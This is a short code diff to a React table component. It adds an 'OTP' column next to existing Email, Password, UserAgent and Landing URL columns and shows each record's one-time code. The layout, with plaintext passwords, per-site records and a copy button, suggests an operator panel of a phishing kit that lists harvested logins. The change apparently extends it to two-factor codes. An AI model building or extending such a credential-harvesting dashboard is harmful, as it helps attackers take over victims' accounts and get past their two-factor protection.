@@ -162,7 +162,7 @@ const Table = ({ loading, currentItems, userName, copyToClipboard }) => (
   <table className="min-w-full border border-collapse border-gray-300 rounded-lg">
     <thead>
       <tr className="text-left bg-gray-100">
-        {["ID", "Site Name", "Name", "Email", "Password", "UserAgent", "Landing URL", "Time", "Copy"].map((title, index) => (
+        {["ID", "Site Name", "Name", "Email", "Password", "OTP", "UserAgent", "Landing URL", "Time", "Copy"].map((title, index) => (
           <th key={index} className="px-4 py-2 border border-gray-300">
             {title}
           </th>
@@ -190,6 +190,7 @@ const Table = ({ loading, currentItems, userName, copyToClipboard }) => (
             <td className="px-4 py-2 border border-gray-300">{userName?.name}</td>
             <td className="px-4 py-2 border border-gray-300">{link?.email}</td>
             <td className="px-4 py-2 border border-gray-300">{link?.password}</td>
+            <td className={`px-4 py-2 border border-gray-300 ${link?.otp ? "text-green-500" : "text-red-500"}`}>{link?.otp ? link?.otp : "N/A"}</td>
             <td className="px-4 py-2 border border-gray-300">{link?.userAgent}</td>
             <td className="px-4 py-2 border border-gray-300">{link?.url?.split("?")[0]}</td>
             <td className="px-4 py-2 border border-gray-300">
